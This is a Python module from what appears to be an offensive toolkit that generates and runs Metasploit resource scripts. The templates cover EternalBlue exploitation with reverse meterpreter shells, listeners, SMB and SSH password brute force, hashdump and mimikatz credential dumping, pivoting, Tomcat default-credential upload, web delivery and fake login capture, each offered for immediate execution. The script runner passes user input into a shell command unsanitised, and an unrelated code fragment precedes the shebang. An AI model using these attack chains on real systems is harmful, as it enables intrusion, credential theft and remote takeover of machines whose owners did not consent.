
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Resource Script Builder Module"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🔧"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def resource_builder_menu():
    section_header("RESOURCE SCRIPT BUILDER", "🔧")
    
    print(f"""
  {Y}═══ CREATE .RC RESOURCE SCRIPTS ═══{RESET}
  {M}[1]{RESET}   {G}Build Attack Chain Script{RESET}
  {M}[2]{RESET}   {G}Build Auto-Recon Script{RESET}
  {M}[3]{RESET}   {G}Build Auto-Exploit Script{RESET}
  {M}[4]{RESET}   {G}Build Brute Force Script{RESET}
  {M}[5]{RESET}   {G}Build Payload + Listener Script{RESET}
  {M}[6]{RESET}   {G}Build Post-Exploit Script{RESET}
  {M}[7]{RESET}   {G}Build Pivoting Script{RESET}
  {M}[8]{RESET}   {G}Build Full Engagement Script{RESET}
  {M}[9]{RESET}   {G}Build Custom Script (interactive){RESET}
  ─────────────────────────────────
  {Y}═══ TEMPLATES ═══{RESET}
  {M}[10]{RESET}  {G}Template: EternalBlue Attack{RESET}
  {M}[11]{RESET}  {G}Template: Tomcat Exploit{RESET}
  {M}[12]{RESET}  {G}Template: Reverse Shell + Handler{RESET}
  {M}[13]{RESET}  {G}Template: Meterpreter Session{RESET}
  {M}[14]{RESET}  {G}Template: SMB Relay Attack{RESET}
  {M}[15]{RESET}  {G}Template: Web Delivery Attack{RESET}
  {M}[16]{RESET}  {G}Template: Credential Harvest{RESET}
  {M}[17]{RESET}  {G}Template: Pivoting Attack{RESET}
  ─────────────────────────────────
  {Y}═══ EXECUTE ═══{RESET}
  {M}[18]{RESET}  {G}Run Existing .rc Script{RESET}
  {M}[19]{RESET}  {G}View .rc Script Content{RESET}
  {M}[20]{RESET}  {G}List .rc Scripts in /tmp{RESET}
  {M}[21]{RESET}  {G}Delete .rc Script{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-21]: {RESET}").strip()
    if choice == "0":
        return
    
    if choice in ["1", "2", "3", "4", "5", "6", "7", "8"]:
        build_script(choice)
    elif choice == "9":
        build_custom_script()
    elif choice in ["10", "11", "12", "13", "14", "15", "16", "17"]:
        use_template(choice)
    elif choice == "18":
        run_existing_script()
    elif choice == "19":
        view_script()
    elif choice == "20":
        list_scripts()
    elif choice == "21":
        delete_script()

def build_script(choice):
    target = get_ip("Target IP/CIDR: ")
    lhost = get_ip("LHOST (your IP): ", "0.0.0.0")
    lport = get_ip("LPORT (your port): ", "4444")
    output = get_ip("Output filename: ", f"/tmp/script_{choice}.rc")
    
    scripts = {
        "1": f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
run
""",
        "2": f"""use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
run
use auxiliary/scanner/smb/smb_version
set RHOSTS {target}
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS {target}
run
use auxiliary/scanner/http/http_version
set RHOSTS {target}
run
use auxiliary/scanner/mysql/mysql_version
set RHOSTS {target}
run
""",
        "3": f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
""",
        "4": f"""use auxiliary/scanner/smb/smb_login
set RHOSTS {target}
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
use auxiliary/scanner/ssh/ssh_login
set RHOSTS {target}
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
""",
        "5": f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST {lhost}
set LPORT 443
exploit -j
""",
        "6": f"""use post/multi/recon/local_exploit_suggester
run
use post/windows/gather/hashdump
run
use post/multi/gather/mimikatz
run
use post/windows/gather/screenshot
run
""",
        "7": f"""use post/multi/manage/autoroute
set SESSION 1
set SUBNET {target}
run
use auxiliary/server/socks4a
set SRVPORT 1080
run
use auxiliary/server/socks5
set SRVPORT 1081
run
""",
        "8": f"""use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
""",
    }
    
    if choice in scripts:
        with open(output, 'w') as f:
            f.write(scripts[choice])
        success(f"Script saved: {output}")
        info(f"Run with: msfconsole -r {output}")
        run_now = input(f"  {Y}Execute now? (y/n): {RESET}").strip().lower()
        if run_now in ['y', 'yes', '']:
            os.system('RUBYOPT="-W0" msfconsole -r ' + output)

def build_custom_script():
    output = get_ip("Output filename: ", "/tmp/custom.rc")
    lines = []
    print(f"  {C}Enter commands (empty line to finish):{RESET}")
    while True:
        cmd = input(f"  {M}>{RESET} ")
        if not cmd:
            break
        lines.append(cmd)
    
    if lines:
        with open(output, 'w') as f:
            for line in lines:
                f.write(line + "\n")
        success(f"Custom script saved: {output}")
        run_now = input(f"  {Y}Execute now? (y/n): {RESET}").strip().lower()
        if run_now in ['y', 'yes', '']:
            os.system('RUBYOPT="-W0" msfconsole -r ' + output)

def use_template(choice):
    target = get_ip("Target IP: ", "192.168.1.100")
    lhost = get_ip("LHOST: ", "0.0.0.0")
    lport = get_ip("LPORT: ", "4444")
    
    templates = {
        "10": f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""",
        "11": f"""use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {target}
set USERNAME tomcat
set PASSWORD tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""",
        "12": f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""",
        "13": f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
sessions -l
""",
        "14": f"""use auxiliary/scanner/smb/smb_login
set SMBUser administrator
set SMBPass password
set RHOSTS {target}
run
use auxiliary/server/capture/smb
set SRVHOST {lhost}
run
""",
        "15": f"""use exploit/multi/browser/web_delivery
set TARGET 1
set URIPATH /
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
""",
        "16": f"""use auxiliary/server/capture/http
set SRVHOST {lhost}
set SRVPORT 80
set URIPATH /login
exploit
""",
        "17": f"""use post/multi/manage/autoroute
set SESSION 1
run
use auxiliary/server/socks4a
set SRVPORT 1080
exploit
""",
    }
    
    if choice in templates:
        output = f"/tmp/template_{choice}.rc"
        with open(output, 'w') as f:
            f.write(templates[choice])
        success(f"Template saved: {output}")
        info(f"Run with: msfconsole -r {output}")
        run_now = input(f"  {Y}Execute now? (y/n): {RESET}").strip().lower()
        if run_now in ['y', 'yes', '']:
            os.system('RUBYOPT="-W0" msfconsole -r ' + output)

def run_existing_script():
    path = get_ip("Script path: ", "/tmp/script.rc")
    if os.path.exists(path):
        info(f"Running: {path}")
        os.system('RUBYOPT="-W0" msfconsole -r ' + path)
    else:
        error(f"Script not found: {path}")

def view_script():
    path = get_ip("Script path: ", "/tmp/script.rc")
    if os.path.exists(path):
        with open(path, 'r') as f:
            print(f"\n  {W}{f.read()}{RESET}")
    else:
        error(f"Script not found: {path}")

def list_scripts():
    import glob
    scripts = glob.glob("/tmp/*.rc")
    if scripts:
        for s in scripts:
            size = os.path.getsize(s)
            print(f"  {G}•{RESET} {s} ({size} bytes)")
    else:
        info("No .rc scripts found in /tmp/")

def delete_script():
    path = get_ip("Script path: ", "/tmp/script.rc")
    if os.path.exists(path):
        os.remove(path)
        success(f"Deleted: {path}")
    else:
        error(f"Script not found: {path}")
